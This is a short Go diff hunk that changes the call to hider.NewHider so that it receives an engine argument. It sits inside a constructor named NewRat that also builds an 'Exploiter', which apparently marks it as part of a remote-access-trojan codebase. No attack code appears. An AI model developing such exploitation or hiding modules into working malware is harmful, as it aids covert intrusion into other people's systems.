@@ -47,7 +47,7 @@ func NewRat() (*Rat, error) {
 		return nil, fmt.Errorf("NewExploiter: %w", err)
 	}
 
-	hdr, err := hider.NewHider()
+	hdr, err := hider.NewHider(eng)
 	if err != nil {
 		return nil, fmt.Errorf("NewHider: %w", err)
 	}
